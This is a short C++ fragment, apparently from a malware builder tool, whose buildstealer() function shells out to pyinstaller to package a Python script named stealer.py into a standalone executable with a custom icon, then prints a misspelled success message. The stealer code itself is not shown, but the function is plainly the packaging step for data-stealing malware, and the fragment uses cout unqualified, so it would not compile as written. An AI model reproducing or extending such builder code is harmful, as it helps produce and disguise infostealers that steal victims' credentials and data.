#include <iostream>
#include <fstream>
#include <string>

void buildstealer() {
    system("start cmd /k pyinstaller --onefile scripts\\tools\\stealer\\stealer.py -i scripts\\tools\\stealer\\logo.png");
    cout << "Compile succes";
}